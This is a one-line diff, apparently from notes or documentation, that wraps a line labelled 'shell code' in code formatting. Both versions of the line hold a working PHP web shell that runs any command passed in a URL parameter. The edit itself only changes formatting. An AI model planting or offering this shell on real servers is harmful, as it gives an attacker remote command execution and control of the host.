@@ -1,1 +1,1 @@
-shell code: <?php system($_GET['cmd']); ?>
+shell code: ```<?php system($_GET['cmd']); ?>```
